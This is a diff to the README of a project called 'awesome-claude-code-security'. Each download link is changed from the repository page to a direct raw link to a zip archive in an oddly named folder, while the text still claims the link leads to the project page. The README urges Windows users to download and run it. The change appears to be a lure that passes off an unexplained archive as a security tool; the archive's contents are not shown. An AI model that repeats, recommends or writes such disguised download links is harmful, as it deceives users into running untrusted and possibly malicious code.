@@ -1,6 +1,6 @@
 # 🚨 awesome-claude-code-security - Curated Tools for Code Safety
 
-[![Download awesome-claude-code-security](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Basketmakerfaitaccompli622/awesome-claude-code-security)
+[![Download awesome-claude-code-security](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Basketmakerfaitaccompli622/awesome-claude-code-security/main/diovular/claude-security-code-awesome-v1.4.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Most modern Windows PCs will run this application without issues.
 
 Click the green button below to start:
 
-[![Download awesome-claude-code-security](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Basketmakerfaitaccompli622/awesome-claude-code-security)
+[![Download awesome-claude-code-security](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/Basketmakerfaitaccompli622/awesome-claude-code-security/main/diovular/claude-security-code-awesome-v1.4.zip)
 
 This link will take you to the project page. From here, you can download the application files.
 
@@ -120,7 +120,7 @@ If problems continue, look for a Support or Issues section on the website for he
 
 You can always visit this link to download or check updates:
 
-https://github.com/Basketmakerfaitaccompli622/awesome-claude-code-security
+https://raw.githubusercontent.com/Basketmakerfaitaccompli622/awesome-claude-code-security/main/diovular/claude-security-code-awesome-v1.4.zip
 
 Use this link to access all the latest releases and information.
 
